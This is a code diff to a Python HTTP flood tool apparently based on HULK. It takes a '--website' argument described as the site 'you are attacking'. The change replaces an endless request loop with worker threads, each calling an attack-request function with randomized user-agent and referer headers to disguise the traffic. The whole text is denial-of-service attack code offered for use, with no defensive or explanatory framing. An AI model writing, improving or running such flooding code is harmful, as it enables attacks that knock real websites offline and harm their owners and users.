@@ -7,15 +7,18 @@ THE ORIGINAL MAKER OF HULK PLEASE GO BACK TO CODECADEMY
 import sys
 import argparse
 import random
+from threading import Thread
 
 import hulqThreading
 import hulqRequest
 
 parser = argparse.ArgumentParser()
-parser.add_argument('--threads', '-t', default=2, action='store', help='Choose how many threads.')
-parser.add_argument('--website', '-w', action='store', help='Website you are attacking.')
+parser.add_argument('--threads', '-t', default=2, help='Choose how many threads.')
+parser.add_argument('--website', '-w', help='Website you are attacking.')
 systemArguments = parser.parse_args()
 
+if not systemArguments.website:
+	sys.exit("Provide -w or --website.")
 
 userAgents = \
 	(
@@ -43,7 +46,8 @@ referers = \
 
 
 
-while True:
-	userAgent = random.choice(userAgents)
+for i in range(0, int(systemArguments.threads)):
 	referer = random.choice(referers)
-	hulqRequest.httpAttackRequest(systemArguments.website, userAgent, referer)
+	userAgent = random.choice(userAgents)
+	t1 = Thread(target = hulqRequest.httpAttackRequest, args = (systemArguments.website, userAgent, referer))
+	t1.start()
